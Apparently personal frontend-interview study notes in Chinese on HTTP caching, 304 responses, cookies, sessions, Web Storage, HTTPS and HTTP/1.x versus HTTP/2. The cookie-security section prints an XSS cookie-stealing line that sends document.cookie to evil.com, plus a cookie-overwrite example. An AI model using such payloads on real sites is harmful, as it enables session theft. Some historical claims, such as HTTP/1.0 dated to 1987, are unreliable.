### 一 面试题汇总

1. 状态码304
2. 宏任务与微任务
3. http缓存的方法有哪些，它们的优先级是怎样的 ？
   - 文章： https://segmentfault.com/a/1190000018802578、
4. 浏览器缓存 老生常谈的问题
5. 都说要减少 https 的请求，https 为什么慢 ？
6. http 1.0 与 http 2.0
7. XSS与CSRF

### 1 状态码: 304

客户端有缓存情况下服务端的一种响应.

协商缓存 => 　`if-modified-since (基于最后修改时间)`

- 发现自己缓存的文件有 Last Modified ，那么在请求中会包含 If Modified Since

- 如果请求中包含 If Modified Since，就说明已经有缓存在客户端，

  此时需要判断返回的是304还是200

  - 虽然在返回 304 的时候已经做了一次数据库查询，但是可以避免接下来更多的数据库查询，并且没有返回页面内容而只是一个 HTTP Header

> 1. 响应头部若有
>
>    Last-Modified: Fri, 17 Mar 2017 09:42:02 GMT
>
> 2. 浏览器请求头会增加 
>
>    If-Modified-Since: Fri, 17 Mar 2017 09:42:02 GMT

### 3 关于浏览器缓存资源

>  浏览器缓存只存在于每个单独的客户端，因此它是私有缓存，而非共享缓存（多用户）如何启用缓存?
>
>  1. Cache-Control
>  2. Expires
>  3. Last-Modified

#### 1 开启缓存

- 浏览器根据 response Headers 字段决定是否缓存资源

  1. Cache-Control

     ```js
     Cache-Control: private/public
     Cache-Control: max-age=300
     Cache-Control: no-cache
     ```

     - `private` ：表示该资源只能被浏览器缓存。
     - `public` ：该资源既能被浏览器缓存，也能被任何中间人（比如代理服务器、CDN 等）缓存。
     - `max-age` ：够被缓存的最大时间。`为0` 该资源仍然会被浏览器缓存，只不过立刻就过期了。
     - `no-cache` ：该资源会被缓存，但是立刻就过期了，因此需要先和服务器确认资源是否发生变化，只有当资源没有变化时，该缓存才会被使用，否则需要从服务器下载。相当于 `max-age=0`

  2. Expries

     也可以通过此参数来控制缓存

     `Expires` 标识了缓存的`具体过期时间`，来控制资源何时过期

     ```typescript
     Expires: Fri, 08 Mar 2029 08:05:59 GMT
     Expires: 0 // Expires: 0 仍然会启用缓存，只不过缓存立刻过期。
     ```
     
  3. 请查看304，这是浏览器默认的缓存

#### 2 优先级

- 哪一个会成功呢？

  1. Cache-Control: max-age=600
  2. Expires: 0

  Cache-Control 的优先级高于 Expires

#### 3 浏览器的默认行为

即便你不设置 cache-control 与 expries， 浏览器也会缓存一些内容。

具体查看状态码304的答案

- Response Header 中有 Last-Modified 但是没有 Cache-Control 和 Expires 时，

  浏览器会用一套自己的算法来决定这个资源会被缓存多长时间

#### 4 禁止缓存

给 `Cache-Control` 设置 `no-store` 会禁止浏览器和中间人缓存该资源。

在处理包含个人隐私数据或银行业务数据的资源时很有用。

#### 5 缓存位置/命中

以 `billbill`网站为例，便可看到其存在三种不同的size。 这便是缓存位置的不同。

![image-20210925144909241](../images/image-20210925144909241.png)

> 1. Service Worker: 浏览器缓存资源的一个网络代理，具体略。
> 2. Memory Cache: 内存缓存
> 3. Disk Cache : 硬盘缓存
> 4. Push Cache： 只在会话（Session）中存在， chrome仅存在5分钟
>
> 若以上依次都没有命中，则发起`网络请求`

#### 6 ⭐ 缓存分类

> 普通刷新会启用协商缓存，忽略强缓存.
>
> 只有在地址栏或收藏夹输入网址、通过链接引用资源等情况下，浏览器才会启用强缓存

1. 强缓存    （也称本地缓存）

   ⭐ 给资源设置个过期时间，客户端每次请求资源时都会看是否过期；只有在过期才会去询问服务器。

2. 协商缓存（也称弱缓存）

   ⭐ 协商缓存就是需要客户端和服务器两端进行交互的

> 浏览器缓存机制

1. 会先去缓存里面查看是否命中强缓存，如果命中，则直接从缓存中读取资源，不会发送请求到服务器

   或者 `如果强缓存时间过期， 也属于未命中！`

2. 当强缓存没有命中时，浏览器一定会向服务器发起请求。

   - 服务器会根据 Request Header 中的一些字段来判断是否命中协商缓存。

   - 如果命中协商缓存，服务器会返回响应，但是不会携带任何响应实体，只是告诉浏览器可以直接从缓存中获取这个资源。

   - 否则，进入下一步。

3. 如果前两步都没有命中，则直接从服务器加载资源

#### 7 关闭缓存

1. cache-control: no-cache

   跳过设置强缓存，但是不妨碍设置协商缓存；

   一般如果你做了强缓存，只有在强缓存失效了才走协商缓存的，设置了no-cache就不会走强缓存了，每次请求都回询问服务端。

   - no-cache，浏览器和缓存服务器都不应该缓存页面信息； 

2. cache-control: no-store

   不缓存，这个会让客户端、代理服务器都不缓存，也就没有所谓的强缓存、协商缓存了

   - no-store，请求和响应的信息都不应该被存储在磁盘系统中；

### 4 浏览器缓存数据 【会话跟踪技术】

> 1.  cookie
> 2. **session**
> 3. **localStorage**
>
> > Cookie通过在客户端记录信息确定用户身份，Session通过在服务器端记录信息确定用户身份。

- cookie、localStorage、sessionStorage既然是同源策略，为什么不安全呢？

  - 你可以设置httponly，即无法通过js读写.

  - 验证码 => 需要验证两个 cookie，一个验证的是用户名，一个验证的是随机数，由于是随机数

    故大大提高了难度

  - 利用加密方式防止明文值被破解

  - **强制要求开启HTTPS连接**

    服务器传送cookie时设置属性secure为true,表示创建的cookie只能在HTTPS连接中被浏览器传递到服务器端进行会话验证

  - 

  1. `xss攻击,` 盗取cookie的数据！获取私有用户的信息。 合肥项目的cookie开发环境的cookie的设置！

     ````js
     new Image().src=”http://www.evil.com?”+escape(document.cookie)
     ````

     即便secure开启且https => 你可以覆盖cookie的方法,对google进行了攻击

     ```js
     document.cookie=”user=admin;domain=’.test.com’;path=’/aaa’;secure;httponly”
     ```

  2. 

#### 1 cookie

- 为什么要有cookie

  1. 在下一个请求发送时，服务器无法确定这次请求和上次的请求是否来自同一个客

     户端。`如何让服务器知道不同的请求是否来自同一个客户端`

     HTTP是一种无状态的协议

  2. cookies就是http的一个扩展

     有两个http头部是专门负责设置以及发送cookie的,它们分别是`Set-Cookie`以及`Cookie`

     - Set-Cookie

       客户端建立一个cookie，并且在后续的http请求中自动发送这个cookie到服务器端，直到这个cookie过期。如果cookie的生存时间是整个会话期间的话，那么浏览器会将cookie保存在内存中，浏览器关闭时就会自动清除这个cookie

     - Cookie

       保存在客户端， 览器关闭的话，该cookie也不会被清除。下次打开浏览器访问对应网站时，这个cookie就会自动再次发送到服务器端

- cookie的特点

  1. 会话cookie: 不设置过期时间，cookie被保存在`内存`中，生命周期`随浏览器的关闭`而`结束`

     `设置`了cookie的过期时间, 

     cookie被保存在`硬盘`中，关闭浏览器后，cookie数据仍然存在，`直到过期时间结束`才消失

  2. `每次网络请求` Request headers 中都会带上cookie, 故cookie 太多太大会消耗带宽

     一般`浏览器存储cookie` 最大容量为4k，所以大量数据不要存到cookie

     cookie只能保存`字符串`类型，以文本的方式

  3. 保存在客户端上。

- 场景：用于记录不敏感信息
  1. 用户是否登陆过网站,
  2. 保存上次查看的页面、浏览计数这类信息
  
- cookie

  1. 客户端发送一个http请求到服务器端
  2. 服务器端发送一个http相应到客户端，响应头包含Set-Cookie头部
  3. 客户端发送一个http请求到服务器端，请求头包含Cookie头部
  4. 服务器端发送一个http响应到客户端

#### 2  session

> session 是如何诞生的?
>
> > Session是服务器端使用的一种记录客户端状态的机制，使用上比Cookie简单一些，相应的也增加了服务器的存储压力。
>
> - cookie的致命性缺点:
>   1. cookie 是存在客户户端，而且它本身存储的尺寸大小也有限,但这不致命
>   2. `致命的缺点`: 用户可以是可见的，并可以随意的修改，很不安全. cookie存储于客户端

- session的运行机制
  1. 用户第一次的登录 => 浏览器会将用户信息发送给服务器 
  2. 服务器创建SessionId， 响应内容（Cookie）中将该SessionId一并返回给浏览器， 
  3. 浏览将其以特定key值`存储于cookie `【如SessionId】
  4. 下一次服务器接收到请求信息cookie，便可获取Session，可根据SessionId获知用户的Session并返回给浏览器
  
- 应用场景
  1. 与cookie大同小异
  
- 特性：、

  1. 只要关闭浏览器，session保存的cookie如 sessionId会被清空， `但session绝不会被清空！`

     为什么会这样?

     - session依赖的cookie特殊，该Cookie为服务器自动生成的，它的maxAge属性一般为–1，

       表示仅当前浏览器内有效

     - 如果客户端浏览器将Cookie功能禁用， session也会失效

  2. 这类子窗口会共享父窗口的Cookie，因此会共享一个Session

#### 3 WebStorage

> 即便是 session也无非是借助了cookie, 将任务转移到了服务器端以保证安全性。
>
> 有没有更好的的方案？
>
> 但其实 cookie还是不可获取的，因为我们确实要与服务器端进行交互
>
> Web Storage仅仅是为了在本地“存储”数据而生。

- WebStorage目标
  1. 摆脱cookie
  2. 希望数据量更大
  3. 跨会话

- 共性:

  1. 不与服务器通信。
  2. 可以存储5MB
  3. 字符串类型， 故建议是json字符串

- `改革之处`
1. 不再需要向服务器发送cookie了！不仅更加安全而且更快速了！
  2. 解决了cookie存储空间不足的问题


#### 3.1 localStorage

1. `除非主动删除`。 否则即便是关闭了页面、关闭了浏览器也不销毁。

   同一个浏览器的不同标签页。所以可以共享

2. 场景: 

   常用于长期登录（判断用户是否已登录），适合长期保存在本地的数据 

#### 3.2 sessionStorage

1. 当前会话！

   sessionStorage是不可以非同源跨标签访问的！除非其是同源， 故很适合SPA页面开发.

   `在关闭窗口或`标签页`之后将会删除这些数据。

   而传统的 cookie是目标是当前浏览器进程！

2. 应用场景:

   敏感账号一次性登录；

### 5 https

> 什么叫https?
>
> http: HyperText Transfer Protocol 超文本传输协议
>
> `S` Secure Socket Layer => 即 SSL

- 为什么要有https？ 为什么需要 SSL加密?

  传统的http是如此的： 客户端与服务器之间`没有任何身份确认的过程`，且是明文

  故存在风险

  1. 窃听, 黑客可获知通信的内容
  2. 篡改: 黑客可修改通信的内容
  3. 劫持: 黑客可冒充客户端与服务端的某一身份

#### 1 解决窃听问题

`使用加密`    对称加密+非对称加密

1. 对称加密： 加密和解密同用一个密钥, 即**任何人只要持有密钥就能解密了**
   - 以对称加密方式加密时必须将密钥也发给对方

   但这样被窃听以后，显然可以获取到密钥，毫无意义。因为是明文!
   
   - 缺点： 数据安全！
   
2. 非对称加密：

   公开密钥加密使用一对非对称的密钥。一把叫做私有密钥，另一把叫做公开密钥

   发送密文的一方使用**对方的公开密钥**进行加密处理，对方收到被加密的信息后，再使用自己的私有密钥进行解密。

   这样即使被劫持到了公钥也是无所谓的事情。

   - 缺点： 解密效率问题！

3.  对称加密+非对称加密

   使用 非对称加密 将 【对称加密的密钥】进行加密。

   对方使用 私钥进行 解密， 获得 【对称密钥】

   - **可以确保交换的密钥是安全的前提下，使用对称加密方式进行通信**
   - 且效率良好！

#### 2 篡改问题

解决： 使用数字签名 => 但与劫持问题有相同问题， 你如何解密我的数字签名? 

> **证书颁发机构 **  故需要第三方机构

#### 3 劫持问题

数字证书认证机构处于客户端与服务器双方都可信赖的第三方机构的立场上。

> 第三方机构

1. 服务器的运营人员向第三方机构CA提交公钥、组织信息、个人信息(域名)等信息并申请认证;
2. CA给与服务器方
   - 申请者公钥
   - 数字签名的密文
   - 证书信息
3. 客户端发送请求 => 服务器返回证书文件
4. 客户端读明文信息， 使用CA公钥解密，对比第三方的证书信息，确定合法性。

#### 4 与http区别、https更慢

- https 建立于 SSL加密通道【加密数据】， http是明文传输
- HTTPS需要用到SSL证书，而HTTP不用;

其次 https被认为性能慢于 http

1. 性能消耗要大于HTTP, 因为并非是纯文本传输数据，**加密通信会消耗更多的CPU及内存资源**	

### 6 http1.x与http2.0

文档: https://segmentfault.com/a/1190000015316332

文档-2： https://segmentfault.com/a/1190000012975173?utm_source=sf-similar-article

> 历史的进程已然走到了今天，不知道未来又如何？
>
> 1. 1987年发布http协议1.0版本
>
> 2. 1997年发布http1.1协议 => tcp的复用方案 => 即熟知的 connection: keep-alive特性
>
> 3. 伴随移动端的 的越来越普及，图片与视频的加载越来越多，故 google提出 spdy协议。
>
>    http2即基于spdy协议，目前仍在提案。同期，quic协议提出，基于udp模拟tcp的面向连接。

#### 1. http1.x

> ❗ http 1.x 有一个致命的问题

- **缺陷**：线程阻塞，在同一时间，同一域名的请求有一定数量限制，超过限制数目的请求会被`阻塞`
- 这更像是安全机制： `并发限制`
- 所以真的存在大量的图片， 建议使用两个域名来分别处理。

#### 2 http1.0

- 浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接

  服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求；

  而问题在于 tcp 需要三次 客户端与服务器端的握手才可以，其每次tcp连接的成本很高

- 解决： 添加 `Connction:  keep-alive`

#### 3 http1.1

是改进版本

1. **持久连接**

   - 即默认的Tcp连接便不关闭，且可复用。

     在1.1之后Connection的默认值就是Keep-Alive

2. 管道机制

   - 同一个tcp连接，客户端可以发送多个请求

     多个HTTP请求放到一个TCP连接中一一发送，而在发送过程中不需要等待服务器对前一个请求的响应

     显然这样管道传输也会带来对应的缺点！

     - 注意： 但是pipelining并不能彻底解决holb的问题，比如只有GET，HEAD才能使用，POST不能使用，

     <img src="C:/Users/HuangPeng/AppData/Roaming/Typora/typora-user-images/image-20210927002719225.png" alt="image-20210927002719225" style="zoom:50%;" />

3. 分块传输编码

   服务器一旦有数据就传输，以【流模式】代替【缓存模式】。 相当于分块

4. 更多的请求方式

   RESTful方式 => put、delete、options等

5. 缺点

   - 用TCP连接，但是同一个TCP连接里面，所有的数据通信是**按次序进行**的。

     `服务器只有处理完一个请求，才会接着处理下一个请求`

   - 解决方案

     减少请求数、或同时多开持久连接

#### 4 http2

1. 二进制

   http2的头信息现在是 二进制！ 即 帧

   HTTP消息分解为很多独立的帧之后，就可以通过优化这些帧的交错和传输顺序

2. **完全多路复用**

   客户端和浏览器都可以同时发送多个请求或回应， 而且不用按照顺序一一对应

   - 实现： 

     一个request对应一个id，这样一个连接上可以有多个request。

     每个连接的request可以随机的混杂在一起，接收方可以根据request的id将request再归属到各自不同的服务端请求里面

3. **报头压缩**

   - 对于相同的头部，不必再通过请求发送，只需发送一次。

     比如每次都发送cookie这件事情！

     客户端和服务器同时维护一张头信息表，所有字段都会存入这个表，产生一个索引号，之后就不发送同样字段了，只需发送索引号

   - 头信息压缩机制， gzip或compress压缩后再发送

4.  **服务器推送**

   HTTP/2 允许服务器未经请求，主动向客户端发送资源

#### 4 关于https

https不关心你是htpp1还是http2

HTTP协议通常承载于TCP协议之上， 在HTTP和TCP之间添加一个安全协议层（SSL或TSL），这个时候，就成了我们常说的HTTPS.

